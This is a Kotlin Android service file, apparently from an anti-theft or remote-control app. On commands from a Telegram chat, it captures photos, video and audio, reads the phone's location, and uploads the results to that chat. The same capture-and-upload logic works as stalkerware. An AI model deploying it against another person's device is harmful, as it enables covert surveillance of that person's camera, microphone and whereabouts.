package com.save.me

import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.AudioManager
import android.media.RingtoneManager
import android.os.*
import android.view.SurfaceHolder
import android.view.View
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import android.content.pm.ServiceInfo
import java.util.concurrent.ConcurrentHashMap

class ForegroundActionService : Service() {
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val runningJobs = ConcurrentHashMap<Long, Job>()
    private val overlayViews = ConcurrentHashMap<Long, View?>()
    private val surfaceHolders = ConcurrentHashMap<Long, SurfaceHolder?>()
    private var wakeLock: PowerManager.WakeLock? = null

    override fun onCreate() {
        super.onCreate()
        log("onCreate")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        log("onStartCommand() called with intent=$intent, flags=$flags, startId=$startId")
        val action = intent?.getStringExtra("action") ?: ""
        val chatId = intent?.getStringExtra("chat_id")
        val commandId = intent?.getLongExtra("command_id", -1L) ?: System.currentTimeMillis()

        log("Received command: action=$action, chatId=$chatId, commandId=$commandId")

        // --- 1. Wake the screen if camera/video (do not try to unlock, just wake the screen)
        if (action == "photo" || action == "video") {
            wakeScreenOnly()
            log("WakeLock (screen on only) acquired at onStartCommand entry (before notification/foreground)")
            try {
                Thread.sleep(350)
            } catch (e: Exception) {
                log("Exception during Thread.sleep(350): ${e.message}")
            }
        }

        logPermissions()

        // --- FIX 1: Immediately show notification to prevent RemoteServiceException (Android 8+ requirement)
        showNotificationForAction(action)

        // --- FIX 2: Permission check is now version-aware (do not block on Android < 14 for new foreground permissions)
        if ((action == "photo" || action == "video") && !hasAllCameraPermissionsCompat()) {
            log("PERMISSION ERROR: Required camera or foreground service camera permission not granted. Aborting photo/video.")
            // --- FIX 3: Always send error in background and never block main thread with network
            serviceScope.launch {
                sendError("Camera or foreground service camera permission not granted. Please grant permissions in app settings.", chatId, commandId)
                log("Stopping service due to permission error")
                stopSelf()
            }
            return START_NOT_STICKY
        }

        log("onStartCommand: action=$action, commandId=$commandId, startId=$startId")

        // MOVED cleanupCommand and runningJobs.remove to after camera is finished (see below)
        val job = serviceScope.launch {
            var cameraActionCompleted = false // To track if camera action is done (for Android 11 fix)
            log("Starting job for action=$action, commandId=$commandId")
            try {
                when (action) {
                    "photo", "video" -> {
                        log("Preparing to await surface overlay for camera action: $action")
                        val overlayResult = withTimeoutOrNull(3500) {
                            OverlayHelper.awaitSurfaceOverlay(this@ForegroundActionService)
                        }
                        if (overlayResult == null) {
                            log("FAILURE: OverlayHelper.awaitSurfaceOverlay returned null -- overlay permission not granted or timed out!")
                            sendError("Unable to create camera surface for $action. Overlay permission required.", chatId, commandId)
                            releaseWakeLock()
                            log("Camera action aborted due to overlay failure for commandId=$commandId")
                        } else {
                            val (holderReady, overlay) = overlayResult
                            log("Overlay and surface received for $action: holderReady=$holderReady, overlay=$overlay")
                            overlayViews[commandId] = overlay
                            surfaceHolders[commandId] = holderReady

                            log("Overlay and surface ready for $action, proceeding to capture for commandId=$commandId...")
                            cameraActionCompleted = handleCameraActionWithCleanup(action, intent, chatId, commandId)
                            log("Camera action completed for commandId=$commandId, result=$cameraActionCompleted")
                            releaseWakeLock()
                        }
                    }
                    "audio" -> {
                        log("Starting audio recording for commandId=$commandId")
                        handleAudioRecording(intent, chatId, commandId)
                        log("Audio recording completed for commandId=$commandId")
                    }
                    "location" -> {
                        log("Starting location retrieval for commandId=$commandId")
                        handleLocation(chatId, commandId)
                        log("Location retrieval completed for commandId=$commandId")
                    }
                    "ring" -> {
                        log("Starting ring for commandId=$commandId")
                        handleRingInBackground(commandId)
                        log("Ring command completed for commandId=$commandId")
                    }
                    "vibrate" -> {
                        log("Starting vibrate for commandId=$commandId")
                        handleVibrateInBackground(commandId)
                        log("Vibrate command completed for commandId=$commandId")
                    }
                    else -> {
                        log("Unknown action: $action for commandId=$commandId")
                        if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
                    }
                }
            } catch (e: Exception) {
                log("EXCEPTION: Exception in job for commandId=$commandId: ${e.message}")
                sendError("Internal error: ${e.localizedMessage}", chatId, commandId)
            } finally {
                log("Job finally block for commandId=$commandId, cameraActionCompleted=$cameraActionCompleted, action=$action")
                val doCleanup = !(action == "photo" || action == "video") || cameraActionCompleted
                log("doCleanup=$doCleanup for commandId=$commandId")
                if (doCleanup) {
                    log("Cleaning up commandId=$commandId")
                    cleanupCommand(commandId)
                    runningJobs.remove(commandId)
                    log("Removed job for commandId=$commandId, remaining jobs: ${runningJobs.keys}")
                    if (runningJobs.isEmpty()) {
                        log("All jobs complete, stopping service")
                        stopSelf()
                    }
                } else {
                    log("Not cleaning up commandId=$commandId yet due to camera action not completed")
                }
            }
        }
        log("Adding job for commandId=$commandId to runningJobs map")
        runningJobs[commandId] = job
        log("Current runningJobs: ${runningJobs.keys}")
        return START_NOT_STICKY
    }

    // --- FIX 2: Android version-aware permission check
    private fun hasAllCameraPermissionsCompat(): Boolean {
        val ctx = this
        val pm = android.content.pm.PackageManager.PERMISSION_GRANTED
        val cam = android.Manifest.permission.CAMERA
        val fg = android.Manifest.permission.FOREGROUND_SERVICE

        log("Checking permissions for CAMERA and FOREGROUND_SERVICE")
        // Camera and foreground service permission always required
        if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, cam) != pm) {
            log("CAMERA permission not granted")
            return false
        }
        if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, fg) != pm) {
            log("FOREGROUND_SERVICE permission not granted")
            return false
        }

        // Only check for FOREGROUND_SERVICE_CAMERA on Android 14+ (API 34)
        if (Build.VERSION.SDK_INT >= 34) {
            val fgCam = "android.permission.FOREGROUND_SERVICE_CAMERA"
            if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, fgCam) != pm) {
                log("FOREGROUND_SERVICE_CAMERA permission not granted")
                return false
            }
        }
        log("All required camera permissions granted")
        return true
    }

    private fun wakeScreenOnly() {
        try {
            log("Trying to acquire wake lock for screen only")
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (wakeLock == null) {
                wakeLock = pm.newWakeLock(
                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
                    "com.save.me:CameraWakeLock"
                )
            }
            if (wakeLock?.isHeld == false) {
                wakeLock?.acquire(10_000)
                log("WakeLock (screen only) acquired")
            } else {
                log("WakeLock already held")
            }
        } catch (e: Exception) {
            log("FAILURE: Failed to acquire WakeLock: ${e.message}")
        }
    }

    private fun releaseWakeLock() {
        try {
            log("Trying to release wake lock")
            if (wakeLock?.isHeld == true) {
                wakeLock?.release()
                log("WakeLock released")
            } else {
                log("WakeLock was not held")
            }
        } catch (e: Exception) {
            log("FAILURE: Failed to release WakeLock: ${e.message}")
        }
    }

    /**
     * Fix for Android 15+ "Handler on a dead thread" Camera2 error:
     * - When cleaning up resources (camera/session/imagereader/thread), Camera2 background threads may deliver callbacks after thread is dead.
     * - Always check if handlerThread is alive before posting to handler.
     * - Add try/catch and check for isCompleted on all callbacks to avoid double resume.
     */
    private suspend fun handleCameraActionWithCleanup(type: String, intent: Intent?, chatId: String?, commandId: Long): Boolean {
        log("handleCameraActionWithCleanup called: type=$type, commandId=$commandId")
        val cameraFacing = intent?.getStringExtra("camera") ?: "rear"
        val flash = intent?.getBooleanExtra("flash", false) ?: false
        val quality = intent?.getIntExtra("quality", 720) ?: 720
        val durationMinutes = intent?.getDoubleExtra("duration", 1.0) ?: 1.0
        val outputFile = File(cacheDir, generateFileName(type, quality))
        val actionTimestamp = System.currentTimeMillis()
        val holder = surfaceHolders[commandId]
        if (holder == null) {
            log("FAILURE: No camera surface for $type (commandId=$commandId). This should never happen.")
            sendError("No camera surface for $type.", chatId, commandId)
            log("No camera surface, calling cleanupCommand and removing job for commandId=$commandId")
            cleanupCommand(commandId)
            runningJobs.remove(commandId)
            if (runningJobs.isEmpty()) {
                log("All jobs complete, stopping service")
                stopSelf()
            }
            return true
        }
        val result: Boolean = try {
            log("Invoking CameraBackgroundHelper.takePhotoOrVideo for $type (camera=$cameraFacing, flash=$flash, quality=$quality)...")
            CameraBackgroundHelper.takePhotoOrVideo(
                context = this,
                surfaceHolder = holder,
                type = type,
                cameraFacing = cameraFacing,
                flash = flash,
                videoQuality = quality,
                durationSec = (durationMinutes * 60).toInt(),
                file = outputFile
            )
        } catch (e: Exception) {
            log("EXCEPTION: Exception during $type capture at ${formatDateTime(actionTimestamp)}: ${e.message}")
            sendError("Exception in $type at ${formatDateTime(actionTimestamp)}: ${e.message}", chatId, commandId)
            log("Exception during camera capture, calling cleanupCommand and removing job for commandId=$commandId")
            cleanupCommand(commandId)
            runningJobs.remove(commandId)
            if (runningJobs.isEmpty()) {
                log("All jobs complete, stopping service")
                stopSelf()
            }
            return true
        }
        if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
        if (result && chatId != null) {
            log("SUCCESS: $type captured at ${formatDateTime(actionTimestamp)}. Output file: ${outputFile.absolutePath}")
            UploadManager.queueUpload(outputFile, chatId, type, actionTimestamp)
        } else if (!result) {
            log("FAILURE: $type capture failed at ${formatDateTime(actionTimestamp)}. No file at ${outputFile.absolutePath}")
            if (chatId != null) {
                sendError("Failed to capture $type at ${formatDateTime(actionTimestamp)}.", chatId, commandId)
            }
        }
        log("Camera action finished, calling cleanupCommand and removing job for commandId=$commandId")
        cleanupCommand(commandId)
        runningJobs.remove(commandId)
        if (runningJobs.isEmpty()) {
            log("All jobs complete, stopping service")
            stopSelf()
        }
        return true
    }

    private suspend fun handleAudioRecording(intent: Intent?, chatId: String?, commandId: Long) {
        log("handleAudioRecording called: commandId=$commandId")
        val durationMinutes = intent?.getDoubleExtra("duration", 1.0) ?: 1.0
        val outputFile = File(cacheDir, "audio_${nowString()}.m4a")
        val actionTimestamp = System.currentTimeMillis()
        try {
            AudioBackgroundHelper.recordAudio(this, outputFile, (durationMinutes * 60).toInt())
            log("Audio recording success for commandId=$commandId")
            if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
            if (chatId != null) {
                UploadManager.queueUpload(outputFile, chatId, "audio", actionTimestamp)
            }
        } catch (e: Exception) {
            log("EXCEPTION: Exception in audio recording at ${formatDateTime(actionTimestamp)}: ${e.message}")
            sendError("Exception in audio recording at ${formatDateTime(actionTimestamp)}: ${e.message}", chatId, commandId)
        }
    }

    private fun handleRingInBackground(commandId: Long) {
        log("handleRingInBackground called: commandId=$commandId")
        val duration = 5
        val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        val oldVolume = audioManager.getStreamVolume(AudioManager.STREAM_RING)
        val maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_RING)
        val ringThread = HandlerThread("RingThread").apply { start() }
        val handler = Handler(ringThread.looper)
        handler.post {
            try {
                audioManager.setStreamVolume(AudioManager.STREAM_RING, maxVolume, 0)
                val ringtone = RingtoneManager.getRingtone(applicationContext, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE))
                ringtone.play()
                Handler(Looper.getMainLooper()).postDelayed({
                    ringtone.stop()
                    audioManager.setStreamVolume(AudioManager.STREAM_RING, oldVolume, 0)
                    ringThread.quitSafely()
                    log("Ring finished for commandId=$commandId")
                    if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
                }, (duration * 1000).toLong())
            } catch (e: Exception) {
                log("FAILURE: Exception in handleRing: ${e.message}")
                ringThread.quitSafely()
                if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
            }
        }
    }

    private fun handleVibrateInBackground(commandId: Long) {
        log("handleVibrateInBackground called: commandId=$commandId")
        val duration = 2000L
        val vibrateThread = HandlerThread("VibrateThread").apply { start() }
        val handler = Handler(vibrateThread.looper)
        handler.post {
            try {
                val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
                log("Invoking vibrator for $duration ms for commandId=$commandId")
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    vibrator.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE))
                } else {
                    @Suppress("DEPRECATION")
                    vibrator.vibrate(duration)
                }
                Handler(Looper.getMainLooper()).postDelayed({
                    vibrateThread.quitSafely()
                    log("Vibrate finished for commandId=$commandId")
                    if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
                }, duration)
            } catch (e: Exception) {
                log("FAILURE: Exception in handleVibrate: ${e.message}")
                vibrateThread.quitSafely()
                if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
            }
        }
    }

    private suspend fun handleLocation(chatId: String?, commandId: Long) {
        log("handleLocation called: commandId=$commandId")
        val actionTimestamp = System.currentTimeMillis()
        try {
            val loc = LocationBackgroundHelper.getLastLocation(this)
            if (loc == null) {
                log("FAILURE: Location unavailable at ${formatDateTime(actionTimestamp)}.")
                sendError("Location unavailable at ${formatDateTime(actionTimestamp)}.", chatId, commandId)
                return
            }
            val locationFile = File(cacheDir, "location_${nowString()}.json")
            FileOutputStream(locationFile).use { out ->
                out.write("""{"lat":${loc.latitude},"lng":${loc.longitude},"timestamp":${loc.time}}""".toByteArray())
            }
            log("Location file written for commandId=$commandId: ${locationFile.absolutePath}")
            if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
            if (chatId != null) {
                UploadManager.queueUpload(locationFile, chatId, "location", actionTimestamp)
            }
        } catch (e: Exception) {
            log("EXCEPTION: Exception in location service at ${formatDateTime(actionTimestamp)}: ${e.message}")
            sendError("Exception in location service at ${formatDateTime(actionTimestamp)}: ${e.message}", chatId, commandId)
        }
    }

    override fun onDestroy() {
        log("onDestroy called, cancelling all running jobs and releasing wake lock")
        runningJobs.values.forEach { it.cancel() }
        runningJobs.clear()
        serviceScope.cancel()
        releaseWakeLock()
        super.onDestroy()
    }

    private fun cleanupCommand(commandId: Long) {
        log("cleanupCommand called for commandId=$commandId")
        try {
            overlayViews[commandId]?.let {
                log("Removing overlay for commandId=$commandId")
                OverlayHelper.removeOverlay(this, it)
            }
        } catch (e: Exception) {
            log("FAILURE: Exception in cleanupCommand (overlay removal) for commandId=$commandId: ${e.message}")
        }
        surfaceHolders.remove(commandId)
        overlayViews.remove(commandId)
        log("Removed surfaceHolder and overlayView for commandId=$commandId")
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun showNotificationForAction(action: String) {
        log("showNotificationForAction called for action=$action")
        val notification = androidx.core.app.NotificationCompat.Builder(this, NotificationHelper.CHANNEL_ID)
            .setContentTitle("Remote Control Service")
            .setContentText("Running background actions...")
            .setSmallIcon(R.drawable.ic_notification)
            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_HIGH)
            .setCategory(androidx.core.app.NotificationCompat.CATEGORY_ALARM)
            .build()
        val type = getForegroundServiceType(action)
        log("Calling startForeground: type=$type for action=$action")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && type != 0) {
            try {
                startForeground(1, notification, type)
            } catch (e: SecurityException) {
                log("FAILURE: SecurityException in startForeground! type=$type action=$action: ${e.message}")
                stopSelf()
                return
            }
        } else {
            startForeground(1, notification)
        }
    }

    private fun getForegroundServiceType(action: String): Int {
        return when (action) {
            "photo" -> ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            "video" -> ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            "audio" -> ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            "location" -> ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            "vibrate", "ring" -> {
                if (Build.VERSION.SDK_INT >= 34) {
                    0x00000080 // ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE in AOSP source
                } else {
                    0
                }
            }
            else -> 0
        }
    }

    // --- FIX 3: Always send error on background thread (never call network on main thread)
    private suspend fun sendError(msg: String, chatId: String?, commandId: Long) {
        log("sendError called for commandId=$commandId: $msg")
        if (chatId != null) {
            val deviceNickname = Preferences.getNickname(this) ?: "Device"
            withContext(Dispatchers.IO) {
                UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: $msg")
            }
        }
        if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
    }

    private fun log(msg: String) {
        android.util.Log.d("ForegroundActionService", msg)
    }

    private fun logPermissions() {
        val context = this
        val perms = listOf(
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.RECORD_AUDIO,
            "android.permission.FOREGROUND_SERVICE",
            "android.permission.FOREGROUND_SERVICE_CAMERA",
            "android.permission.FOREGROUND_SERVICE_MICROPHONE",
            "android.permission.FOREGROUND_SERVICE_LOCATION",
            "android.permission.FOREGROUND_SERVICE_SPECIAL_USE"
        )
        val status = perms.joinToString(", ") { perm ->
            "$perm=${androidx.core.content.ContextCompat.checkSelfPermission(context, perm) == android.content.pm.PackageManager.PERMISSION_GRANTED}"
        }
        log("Permission state: $status")
    }

    private fun formatDateTime(ts: Long): String = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US).format(java.util.Date(ts))

    companion object {
        fun start(context: Context) {
            val intent = Intent(context, ForegroundActionService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
        fun stop(context: Context) {
            context.stopService(Intent(context, ForegroundActionService::class.java))
        }
        fun isRunning(context: Context): Boolean = false

        fun startCameraAction(
            context: Context,
            type: String,
            options: JSONObject,
            chatId: String?,
            commandId: Long
        ) {
            val intent = Intent(context, ForegroundActionService::class.java)
            intent.putExtra("action", type)
            intent.putExtra("camera", options.optString("camera", "rear"))
            if (options.has("flash")) intent.putExtra("flash", options.optBoolean("flash", false))
            if (type == "video" || type == "photo") {
                if (options.has("quality")) intent.putExtra("quality", options.optInt("quality", 720))
                if (options.has("duration")) {
                    intent.putExtra("duration", options.optDouble("duration", 1.0))
                }
            }
            chatId?.let { intent.putExtra("chat_id", it) }
            intent.putExtra("command_id", commandId)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun startAudioAction(context: Context, options: JSONObject, chatId: String?, commandId: Long) {
            val duration = options.optDouble("duration", 1.0)
            val intent = Intent(context, ForegroundActionService::class.java)
            intent.putExtra("action", "audio")
            intent.putExtra("duration", duration)
            chatId?.let { intent.putExtra("chat_id", it) }
            intent.putExtra("command_id", commandId)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
        fun startLocationAction(context: Context, chatId: String?, commandId: Long) {
            val intent = Intent(context, ForegroundActionService::class.java)
            intent.putExtra("action", "location")
            chatId?.let { intent.putExtra("chat_id", it) }
            intent.putExtra("command_id", commandId)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
        fun startRingAction(context: Context, options: JSONObject, commandId: Long) {
            val intent = Intent(context, ForegroundActionService::class.java)
            intent.putExtra("action", "ring")
            intent.putExtra("command_id", commandId)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
        fun startVibrateAction(context: Context, options: JSONObject, commandId: Long) {
            val intent = Intent(context, ForegroundActionService::class.java)
            intent.putExtra("action", "vibrate")
            intent.putExtra("command_id", commandId)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun generateFileName(type: String, quality: Int): String {
            val sdf = java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.US)
            return if (type == "video") {
                "${type}_${quality}p_${sdf.format(java.util.Date())}.mp4"
            } else {
                "${type}_${sdf.format(java.util.Date())}.jpg"
            }
        }
        fun nowString(): String = java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.US).format(java.util.Date())
    }
}